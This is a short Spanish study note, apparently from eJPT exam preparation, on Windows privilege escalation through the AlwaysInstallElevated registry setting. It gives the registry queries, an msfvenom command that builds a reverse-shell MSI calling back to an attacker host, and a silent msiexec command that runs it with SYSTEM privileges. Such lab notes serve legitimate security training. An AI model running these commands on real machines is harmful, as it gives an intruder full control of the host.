- Consulta el registro de las claves AlwaysInstallElevated:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Tenga en cuenta que ambas teclas están configuradas en 1 (0x1).

- En Kali, genere un shell inverso Windows Installer (reverse.msi) usando msfvenom. Actualice la dirección IP de LHOST en consecuencia:  

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

- Transfiera el archivo reverse.msi al directorio C:\PrivEsc en Windows (use el SMB método de servidor de antes).

- Inicie un oyente en Kali y luego ejecute el instalador para activar un shell inverso que se ejecuta con privilegios SYSTEM:  

```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

enlace:
[[Preparacion-Ejpt]]
[[Herramientas]]
[[Registry - AutoRuns]]
[[Generate a Reverse Shell Executable]]

